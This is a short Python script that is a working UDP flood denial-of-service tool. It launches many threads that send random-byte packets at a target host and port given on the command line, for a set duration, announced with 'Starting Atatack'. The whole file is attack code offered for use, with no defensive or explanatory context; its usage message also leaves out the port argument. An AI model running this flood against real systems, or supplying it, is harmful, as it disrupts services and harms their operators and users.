import socket , random , threading , sys , time
OpenPorts = [80,8080,1883]
try:
    target =   str(sys.argv[1])
    port =     int(sys.argv[2])
    threads =  int(sys.argv[3])
    timer =  float(sys.argv[4])
    
except IndexError:
    print('\n[+] Command Usage: Python '+ sys.argv[0] + ' <target> <threads> <time> !')
    sys.exit()

timeout = time.time() + 1 * timer
def attack():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = port
            sock.sendto(bytes*random.randint(5,15),(target,dport))
        return
        sys.exit()
    except:
        pass

print('\n[+] Starting Atatack...')
for x in range(0,threads):
    threading.Thread(target=attack).start()

print('[+] Attack done ..')
